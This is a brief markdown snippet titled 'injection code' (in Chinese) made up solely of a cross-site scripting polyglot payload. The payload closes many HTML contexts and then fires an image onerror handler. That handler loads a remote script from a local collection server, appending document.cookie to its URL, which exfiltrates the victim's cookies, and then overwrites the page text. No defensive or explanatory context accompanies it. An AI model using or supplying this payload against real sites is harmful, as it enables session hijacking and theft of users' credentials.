# 注入代码
```
/*-->]]>%>?></object></script></title></textarea></noscript></style></xmp>'-/'/-alert(1)//><img src=1 id=bait onerror="(function() {var oScript = document.createElement('script');oScript.src = 'http://127.0.0.1:8080/bait.js?' + document.cookie;document.getElementsByTagName('BODY').item(0).appendChild(oScript);document.getElementById('bait').parentNode.innerText = '6666';})()">'
```